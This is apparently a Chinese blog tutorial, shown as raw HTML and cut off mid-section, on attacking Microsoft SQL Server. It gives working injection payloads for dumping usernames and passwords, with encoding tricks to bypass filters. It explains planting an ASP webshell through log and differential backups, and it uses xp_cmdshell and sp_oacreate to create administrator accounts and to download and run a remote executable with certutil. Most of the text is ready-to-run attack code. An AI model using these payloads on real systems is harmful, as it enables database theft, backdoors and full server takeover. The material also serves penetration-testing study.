&lt;p&gt;可使用&lt;code&gt;select IS_MEMBER(&#39;db_owner&#39;)&lt;/code&gt;判断当前用户是否为指定 Microsoft Windows 组或 SQL Server 数据库角色的成员。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;and 1=(select is_member(&#39;db_owner&#39;))
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;基本信息获取&#34;&gt;基本信息获取&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 数据库版本
select @@version

# 获取当前登录用户名
select user

# 获取当前数据库名
select db_name()

# 遍历其他数据库
select db_name(n)

# 是否支持多语句查询
;select user
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;站库分离判断&#34;&gt;站库分离判断&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;判断数据库服务器名和Web应用服务器名是否相等。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from info where id=&#39;1&#39; and host_name()=@@servername;--&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;也可调用xp_cmdshell通过cmd命令判断&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;sql-server-基本语法&#34;&gt;SQL Server 基本语法&lt;/h2&gt;
&lt;h3 id=&#34;注释与空白符&#34;&gt;注释与空白符&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;注释&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/**/
--
;%00
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;空白符&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
select CHAR(01)

/**/
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;运算符&#34;&gt;运算符&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+   加法运算
-   减法运算
*   乘法运算
/   除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去
%   取模运算，返回两数相除后的余数

&amp;amp;   位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0
|   位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0
^   位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为0

=   等于 
&amp;lt;&amp;gt;  不等于
&amp;gt;   大于  
!=  不等于
&amp;lt;   小于  
!&amp;lt;  不小于
&amp;gt;=  大于或等于   
!&amp;gt;  不大于
&amp;lt;=  小于或等于

ALL 如果一组的比较都为 true，则比较结果为 true
AND 如果两个布尔表达式都为 true，则结果为 true；如果其中一个表达式为 false，则结果为 false
ANY 如果一组的比较中任何一个为 true，则结果为 true
BETWEEN 如果操作数在某个范围之内，那么结果为 true
EXISTS  如果子查询中包含了一些行，那么结果为 true
IN  如果操作数等于表达式列表中的一个，那么结果为 true
LIKE    如果操作数与某种模式相匹配，那么结果为 true
NOT 对任何其他布尔运算符的结果值取反
OR  如果两个布尔表达式中的任何一个为 true，那么结果为 true
SOME    如果在一组比较中，有些比较为 true，那么结果为 true
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;mssql-注入&#34;&gt;MSSQL 注入&lt;/h2&gt;
&lt;h3 id=&#34;显错注入&#34;&gt;显错注入&lt;/h3&gt;
&lt;h4 id=&#34;原理&#34;&gt;原理&lt;/h4&gt;
&lt;p&gt;MSSQL中的报错主要靠的是数据类型转换时会进行报错回显。其中类型转换味蕾两类：隐式转换和显示转换。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;隐式转换&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from admin where id =1 and (select user)&amp;gt;0--

select * from admin where id =1|(select user)--

在将 varchar类型的 &#39;dbo&#39; 数据转换成 int 时失败，从而报错回显。
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;显示转换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般利用函数进行转换从而报错，例如&lt;code&gt;cast&lt;/code&gt;和&lt;code&gt;convert&lt;/code&gt;函数。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from admin where id =1 (select CAST(USER as int))

select * from admin where id =1 (select convert(int,user))
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;利用&#34;&gt;利用&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;获取当前数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from fsb_users where user_id = 1 and db_name()&amp;gt;0;--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 394; 
			flex-basis: 945px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218100902668.png&#34; data-size=&#34;788x200&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218100902668.png&#34;
			width=&#34;788&#34;
			height=&#34;200&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218100902668_hu8c3a9dea13378a4d05dbc4f61b30732f_30876_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218100902668_hu8c3a9dea13378a4d05dbc4f61b30732f_30876_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取表&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from fsb_users where user_id = 1 and 1=(select top 1 name from sysobjects where xtype=&#39;u&#39;);--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 437; 
			flex-basis: 1048px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218101336531.png&#34; data-size=&#34;743x170&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218101336531.png&#34;
			width=&#34;743&#34;
			height=&#34;170&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218101336531_hub1f92da688b610d7571ba909f94f5b79_29368_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218101336531_hub1f92da688b610d7571ba909f94f5b79_29368_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在得到一个表后，想要暴其他表时，加入判断条件即可：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from fsb_users where user_id = 1 and 1=(select top 1 name from sysobjects where xtype=&#39;u&#39; and name not in (&#39;fsb_messages&#39;));--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 387; 
			flex-basis: 930px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218101636136.png&#34; data-size=&#34;737x190&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218101636136.png&#34;
			width=&#34;737&#34;
			height=&#34;190&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218101636136_hufdbc9e7cc167407d86d549f3f7763156_30092_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218101636136_hufdbc9e7cc167407d86d549f3f7763156_30092_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取字段&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from fsb_users where user_id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#39;fsb_users&#39;) and name not in (&#39;user_id&#39;));--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 461; 
			flex-basis: 1108px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218102432157.png&#34; data-size=&#34;753x163&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218102432157.png&#34;
			width=&#34;753&#34;
			height=&#34;163&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218102432157_hubfc8a3b7b460b91f64c6d575143fe716_27882_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218102432157_hubfc8a3b7b460b91f64c6d575143fe716_27882_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取数据&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from fsb_users where user_id=1 and 1=(select top 1 user_name+&#39;:&#39;+password from fsb_users);--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 233; 
			flex-basis: 559px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218105845963.png&#34; data-size=&#34;877x376&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218105845963.png&#34;
			width=&#34;877&#34;
			height=&#34;376&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218105845963_hu4a4e938b3afbdd0cac9a9a0d2eee07d3_9693_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218105845963_hu4a4e938b3afbdd0cac9a9a0d2eee07d3_9693_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;其他用法&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 获取表名
id=1 and 1=(select top 1 table_name from information_schema.tables);--
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 获取当前表明和列名
user_id=1 having 1=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 500; 
			flex-basis: 1200px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218105426397.png&#34; data-size=&#34;840x168&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218105426397.png&#34;
			width=&#34;840&#34;
			height=&#34;168&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218105426397_hu576a3bcc38a3264774cb8e2205820ee5_35836_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218105426397_hu576a3bcc38a3264774cb8e2205820ee5_35836_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 暴出其他字段
user_id=1 group by fsb_users.user_id,fsb_users.user_name having 1=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 516; 
			flex-basis: 1240px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218105637916.png&#34; data-size=&#34;837x162&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218105637916.png&#34;
			width=&#34;837&#34;
			height=&#34;162&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218105637916_hu6f263da4b17ffa7926ddf1293faed63c_35868_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218105637916_hu6f263da4b17ffa7926ddf1293faed63c_35868_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;简单绕过&#34;&gt;简单绕过&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;declare&lt;/code&gt;函数时MSSQL中声明局部变量的函数，可用他绕过WAF对关键字的拦截：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from fsb_users where user_id=1;declare @a nvarchar(2000) set @a=&#39;select convert(int,@@version)&#39; exec(@a) --

declare定义变量，set设置变量值，exec执行变量
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 428; 
			flex-basis: 1029px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218112010739.png&#34; data-size=&#34;596x139&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218112010739.png&#34;
			width=&#34;596&#34;
			height=&#34;139&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218112010739_hu2003ff61ce84f4b82b63baa545447983_7918_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218112010739_hu2003ff61ce84f4b82b63baa545447983_7918_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中变量值支持HEX和ascii码，在过滤引号情况下可以编码绕过：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from fsb_users where user_id=1;declare @s varchar(2000) set @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 exec(@s)--

select * from fsb_users where user_id=1;declare @s varchar(2000) set @s= CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(99) + CHAR(111) + CHAR(110) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(116) + CHAR(40) + CHAR(105) + CHAR(110) + CHAR(116) + CHAR(44) + CHAR(64) + CHAR(64) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(115) + CHAR(105) + CHAR(111) + CHAR(110) + CHAR(41) exec(@s)--
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;盲注&#34;&gt;盲注&lt;/h3&gt;
&lt;p&gt;和MySQL中利用思路类似：分割字符并比较。&lt;/p&gt;
&lt;h4 id=&#34;bool盲注&#34;&gt;bool盲注&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 暴数据库
id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &amp;gt;= 97

# 暴数据：test数据库中users表中password列中第一行数据的第一个字符的ascii值
and unicode(substring((select isnull(cast(password as nvarchar(4000)),char(32)) from(select password, row_number() over (order by (select 1)) as limit from test.dbo.users)x where limit=1),1,1))&amp;gt;N
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;时间型盲注&#34;&gt;时间型盲注&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1;if (select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))=1 WAITFOR DELAY &#39;0:0:5&#39;--

id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&amp;gt;1 WAITFOR DELAY &#39;0:0:5&#39;--
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;联合注入&#34;&gt;联合注入&lt;/h3&gt;
&lt;p&gt;MSSQL中的联合查询使用null占位，不使用数字占位是因为可能发生隐式转换。&lt;/p&gt;
&lt;h4 id=&#34;利用-1&#34;&gt;利用&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 查列数
user_id=1 order by 5
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 查数据
user_id=1 union select null,user_name,password,null,null from fsb_users

# 结合报错的union
1 ;SELECT 1 UNION (select CAST(USER as int))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 373; 
			flex-basis: 897px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218153256017.png&#34; data-size=&#34;460x123&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218153256017.png&#34;
			width=&#34;460&#34;
			height=&#34;123&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218153256017_hu5e0dea90a1f543d0e15ffcf6d4af7e53_7481_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218153256017_hu5e0dea90a1f543d0e15ffcf6d4af7e53_7481_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220218153256017&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220218153256017&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;mssql-提权&#34;&gt;MSSQL 提权&lt;/h2&gt;
&lt;p&gt;首先判断权限:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;DB_OWNER权限：备份拿shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SA权限：&lt;code&gt;xp_cmdshell&lt;/code&gt;和&lt;code&gt;sp_oacreate&lt;/code&gt;提权&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;备份拿shell&#34;&gt;备份拿shell&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;备份拿shel的原理就是在备份过程中写入一句话木马。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MSSQL中常见的备份策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每周一次完整备份&lt;/li&gt;
&lt;li&gt;每天一次差异备份&lt;/li&gt;
&lt;li&gt;每小时一次事务日志备份&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;利用备份拿shell需要知道网站根路径信息，且需要网站目录的写权限等。&lt;/p&gt;
&lt;h4 id=&#34;寻找路径&#34;&gt;寻找路径&lt;/h4&gt;
&lt;p&gt;一般有以下几个思路：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;报错信息中找&lt;/li&gt;
&lt;li&gt;字典暴破&lt;/li&gt;
&lt;li&gt;旁站信息收集&lt;/li&gt;
&lt;li&gt;调用存储过程搜索&lt;/li&gt;
&lt;li&gt;读取配置文件之类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般可用&lt;code&gt;xp_cmdshell&lt;/code&gt;、&lt;code&gt;xp_dirtree&lt;/code&gt;、&lt;code&gt;xp_subdirs&lt;/code&gt;来搜索目录信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;xp_dirtree&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;execute master..xp_dirtree &#39;c:&#39;       //列出所有 c:\ 文件和目录,子目录 
execute master..xp_dirtree &#39;c:&#39;,1     //只列 c:\ 文件夹 
execute master..xp_dirtree &#39;c:&#39;,1,1   //列 c:\ 文件夹加文件 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 114; 
			flex-basis: 274px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218165323227.png&#34; data-size=&#34;645x563&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218165323227.png&#34;
			width=&#34;645&#34;
			height=&#34;563&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218165323227_hu440abae7cf456f50b5670e562d4b2f8f_16500_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218165323227_hu440abae7cf456f50b5670e562d4b2f8f_16500_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当执行&lt;code&gt;xp_dirtree&lt;/code&gt;没有回显时，可创建临时表，并将执行结果插入到表中：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1;CREATE TABLE temp (dir varchar(8000),num1 int,num2 int);

id=1;insert into temp(dir,num1,num2) execute master..xp_dirtree &#39;c:&#39;,1,1
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;xp_cmdshell&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用cmd命令搜索&lt;code&gt;test.aspx&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;for /r c:\ %i in (test.aspx) do @echo %i
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1391; 
			flex-basis: 3340px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218171017248.png&#34; data-size=&#34;501x36&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218171017248.png&#34;
			width=&#34;501&#34;
			height=&#34;36&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218171017248_hud0f42db194de039722475e6c9c9607dc_1542_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218171017248_hud0f42db194de039722475e6c9c9607dc_1542_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;不回显情况：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1;CREATE TABLE temp (dir varchar(8000));

id=1;insert into temp(dir) exec master..xp_cmdshell &#39;for /r c:\ %i in (test.aspx) do @echo %i&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;当xp_cmdshell不能调用或报错，一般是SQL Server 阻止了对组件 &lt;code&gt;xp_cmdshell&lt;/code&gt; 的过程 &lt;code&gt;sys.xp_cmdshell&lt;/code&gt; 的访问。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;系统管理员&lt;/strong&gt;可以通过使用 sp_configure 启用&lt;code&gt;xp_cmdshell&lt;/code&gt; ：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 允许修改高级参数 
;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;

# 打开xp_cmdshell 扩展
;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关闭&lt;code&gt;xp_cmdshell&lt;/code&gt; ：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 允许修改高级参数 
;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;

# 打开xp_cmdshell 扩展
;EXEC sp_configure &#39;xp_cmdshell&#39;,0;RECONFIGURE;

;EXEC sp_configure &#39;show advanced options&#39;,0;RECONFIGURE;
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;log备份&#34;&gt;Log备份&lt;/h4&gt;
&lt;p&gt;利用Log备份的条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;已有一次完整的备份文件，即某数据库下得有一个该库的备份文件，且&lt;strong&gt;恢复模式必须是完整模式&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;知晓网站根路径&lt;strong&gt;且可写&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;支持堆叠注入&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 设置恢复模式是完整模式
alter database 库名 set RECOVERY FULL 

create table cmd (a image) 

# 先进行一次完整备份，这样就有备份文件
backup log 库名 to disk = &#39;c:\xxx&#39; with init 

# 插入asp一句话木马`&amp;lt;%execute(request(&amp;quot;a&amp;quot;))%&amp;gt;`
insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 

# 将操作日志备份进asp中
backup log 库名 to disk = &#39;c:\xxx\2.asp&#39;

# 删除掉cmd表
drop table cmd; 
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;差异备份&#34;&gt;差异备份&lt;/h4&gt;
&lt;p&gt;利用差异备份的条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;知晓网站根路径&lt;strong&gt;且可写&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;支持堆叠注入&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 完整备份一次(保存位置可以改)
backup database 库名 to disk = &#39;c:\bak.bak&#39;;--

create table cmd (a image);

# 创建表 cmd 并插入一句话木马
insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E);

# 进行差异备份(只备份变化的部分)
backup database 库名 to disk=&#39;C:\d.asp&#39; WITH DIFFERENTIAL,FORMAT;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;xp_cmdshell&#34;&gt;xp_cmdshell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;测试 xp_cmdshell 是否可以执行&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exec master..xp_cmdshell &#39;ver&#39;
或
execute(&#39;xp_cmdshell &amp;quot;whoami&amp;quot;&#39;) 
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;添加管理员获取控制权&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exec master.dbo.xp_cmdshell &#39;net user hack hack123456 /add&#39;
exec master.dbo.xp_cmdshell &#39;net localgroup administrators hack /add&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;下载远程马，上线获取控制权&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exec master.dbo.xp_cmdshell &#39;cd c:\www &amp;amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#39;;

exec master.dbo.xp_cmdshell &#39;cd c:\www &amp;amp; file.exe&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Certutil 是一个 CLI 程序，可用于转储和显示证书颁发机构（CA），配置信息，证书服务， CA 组件的备份和还原以及验证证书、密钥对和证书链，它作为证书服务的一部分安装。&lt;/p&gt;
&lt;p&gt;Certutil 是 Windows 操作系统上预装的工具，可用于 校验文件MD5、SHA1、SHA256，下载恶意文件和免杀。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;sp_oacreate&#34;&gt;sp_oacreate&lt;/h3&gt;
&lt;p&gt;当xp_cmdshell出问题时，也可考虑用sp_oacreate。&lt;/p&gt;
&lt;p&gt;sp_oacreate可以删除、复制、移动文件，还能配合sp_oamethod来写文件执行cmd，不过这种方式没有回显。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;p&gt;所有涉及到写入的操作都需要根据当前用户是否有权限。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;当被阻止时，可开启该过程&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
EXEC sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;恢复&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exec sp_configure &#39;show advanced options&#39;,1;reconfigure;
exec sp_configure &#39;ole automation procedures&#39;,0;reconfigure;
exec sp_configure &#39;show advanced options&#39;,0;reconfigure;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;调用cmd写用户&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# wscript.shell 执行命令
declare @shell int 
exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user hack Password@ /add&#39;

# Shell.Application 执行命令
declare @o int
